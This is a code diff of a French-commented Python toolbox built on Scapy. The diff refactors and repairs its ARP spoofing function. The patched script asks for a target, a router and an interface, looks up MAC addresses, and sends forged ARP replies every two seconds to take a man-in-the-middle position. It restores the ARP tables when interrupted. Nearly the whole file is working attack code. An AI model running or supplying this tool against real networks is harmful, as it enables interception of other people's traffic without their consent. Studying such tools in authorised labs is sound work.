@@ -1,50 +1,31 @@
-# ---------------------------------------------------------
-
-# Importation des librairies 
-
-#---------------------------------------------------------
-
+# Importation des librairies
 from socket import timeout
-import scapy.all as scapy # on importe tous les modules de Scapy.
-import time # on importe la librairie time permettant de mettre des pauses entre chaque envoient de paquets.
-import argparse # on importe la librairie argparse permettant d'ajouter des arguments très simplement.
-import sys # on importe la librairie sys pour permettre des impressions dynamiques
-
-# ---------------------------------------------------------
+import scapy.all as scapy
+import time
+import argparse
+import sys
 
 # Boîte à outil
+print("""
+  _____                           __  __                      _   _           
+ / ____|                         |  \/  |                    | | (_)           
+| |     __ _  ___  ___  __ _ _ __| \  / | __ ___  _____ _ __ | |_ _ _   _ ___  
+| |    / _` |/ _ \/ __|/ _` | '__| |\/| |/ _` \ \/ / _ \ '_ \| __| | | | / __| 
+| |___| (_| |  __/\__ \ (_| | |  | |  | | (_| |>  <  __/ | | | |_| | |_| \__ \ 
+ \_____\__,_|\___||___/\__,_|_|  |_|  |_|\__,_/_/\_\___|_| |_|\__|_|\__,_|___/ 
+                                                                                
+                                                                                
+""")
 
-# ---------------------------------------------------------
-
-print("""  _____                           __  __                      _   _           
-  / ____|                         |  \/  |                    | | (_)           
- | |     __ _  ___  ___  __ _ _ __| \  / | __ ___  _____ _ __ | |_ _ _   _ ___  
- | |    / _` |/ _ \/ __|/ _` | '__| |\/| |/ _` \ \/ / _ \ '_ \| __| | | | / __| 
- | |___| (_| |  __/\__ \ (_| | |  | |  | | (_| |>  <  __/ | | | |_| | |_| \__ \ 
-  \_____\__,_|\___||___/\__,_|_|  |_|  |_|\__,_/_/\_\___|_| |_|\__|_|\__,_|___/ 
-                                                                                \n
-                                                                                \n """)
-
-# Création de ma fonction main étant le principal menu de ma boîte à outil
-def main():
-    while True:  # Boucle pour revenir aux demandes au cas où l'utilisateur n'interagit pas avec une fonction
-        n = input("1- Network Scanner\n2- ARP Spoofing\n3- Exploit\n\nEntrez un nombre : ")  # Création des choix du menu
-        if n == '1':  # boucle qui renvoie à un print si l'utilisateur choisit 1
-            print("***********************************************************************")
-            print("En cours de construction")
-            print("***********************************************************************")
-        elif n == '2':  # boucle qui va renvoyer l'utilisateur à la fonction s'il choisit 2
-            arpspoof()
-        elif n == '3':  # boucle qui renvoie à un print si l'utilisateur choisit 3
-            print("***********************************************************************")
-            print("En cours de construction")
-            print("***********************************************************************")
-
-        else:  # boucle qui renvoie à un print si l'utilisateur choisit un nombre inexistant du menu
-            print("***********************************************************************")
-            print("Cette option est inexistante")
-            print("***********************************************************************")
-
+# Fonction pour rechercher la MAC
+def recherche_mac(targetIP, interface):
+    pkt7 = scapy.Ether(dst="ff:ff:ff:ff:ff") / scapy.ARP(pdst=targetIP)
+    ans = scapy.srp1(pkt7, iface=interface, timeout=2)
+    if ans:
+        mac = ans[0][1].hwsrc
+        return str(mac)
+    else:
+        print("L'adresse MAC est inexistante")
 
 # Fonction principale permettant de faire fonctionner tout le programme
 def arpspoof():
@@ -62,16 +43,6 @@ def arpspoof():
     destinationIP = targetIP
     sourceIP = input("Entrez votre adresse IP (pour reset lorsque vous aurez terminé) : ")
 
-    # Fonction pour rechercher la MAC
-    def recherche_mac(targetIP, interface):
-        pkt7 = scapy.Ether(dst="ff:ff:ff:ff:ff") / scapy.ARP(pdst=targetIP)
-        ans = scapy.srp1(pkt7, iface=interface, timeout=2)
-        if ans:
-            mac = ans[0][1].hwsrc
-            return str(mac)
-        else:
-            print("L'adresse MAC est inexistante")
-
     # Utilisation de la fonction recherche_mac avec les arguments nécessaires
     destinationMac = recherche_mac(targetIP, interface)
 
@@ -86,15 +57,15 @@ def arpspoof():
         "########: ##:::: ##: ##::. ##:. ######:: ########: ##:::: ##: ########: ##::. ##:::: ##:::::::\n"
         "........::..:::::..::..::::..:::......:::........::..:::::..::........::..::::..:::::..:::::::\n"
     )
-    
+
     def spoofer(targetIP, spoofIP):
-          packet = ARP(op=2, pdst=targetIP, hwdst=destinationMac, psrc=spoofIP)
-          send(packet, verbose=False)
-    
+        packet = scapy.ARP(op=2, pdst=targetIP, hwdst=destinationMac, psrc=spoofIP)
+        scapy.send(packet, verbose=False)
+
     def restore(destinationIP, sourceIP):
-          packet = ARP(op=2, pdst=destinationIP, hwdst=getMac(destinationIP), psrc=sourceIP, hwsrc=sourceMAC)
-          send(packet, count=4, verbose=False)
-    
+        packet = scapy.ARP(op=2, pdst=destinationIP, hwdst=recherche_mac(destinationIP, interface), psrc=sourceIP)
+        scapy.send(packet, count=4, verbose=False)
+
     packets = 0
     try:
         while True:
@@ -105,25 +76,20 @@ def arpspoof():
             packets += 2
             time.sleep(2)
     except KeyboardInterrupt:
-          print("***********************************************************************")
-          print("\nInterrompre le Spoof en faisant CTRL + C------------ Retour à l'état normal..")
-          print("***********************************************************************")
-          print(
-                "\n   _____    ___.   .__               __          __   "
-                "\n  /  _  \   \_ |__ |__| ____   _____/  |_  _____/  |_ "
-                "\n /  /_\  \   | __ \|  |/ __ \ /    \   __\/  _ \   __\""
-                "\n/    |    \  | \_\ \  \  ___/|   |  \  | (  <_> )  |  "
-                "\n\____|__  /  |___  /__|\___  >___|  /__|  \____/|__|  "
-                "\n        \/       \/        \/     \/                  "
-            )
-          print("***********************************************************************")
-          restore(targetIP, routeurIP)
-          restore(routeurIP, targetIP)
-    
-    
-    if __name__ == "__main__":
-      main()
-  
-#-----------------------------------------------------------------------------
-#------------------------------ PARTIE CODE ----------------------------------
-#-----------------------------------------------------------------------------
+        print("***********************************************************************")
+        print("\nInterrompre le Spoof en faisant CTRL + C------------ Retour à l'état normal..")
+        print("***********************************************************************")
+        print(
+            "\n   _____    ___.   .__               __          __   "
+            "\n  /  _  \   \_ |__ |__| ____   _____/  |_  _____/  |_ "
+            "\n /  /_\  \   | __ \|  |/ __ \ /    \   __\/  _ \   __\""
+            "\n/    |    \  | \_\ \  \  ___/|   |  \  | (  <_> )  |  "
+            "\n\____|__  /  |___  /__|\___  >___|  /__|  \____/|__|  "
+            "\n        \/       \/        \/     \/                  "
+        )
+        print("***********************************************************************")
+        restore(targetIP, routeurIP)
+        restore(routeurIP, targetIP)
+
+if __name__ == "__main__":
+    arpspoof()
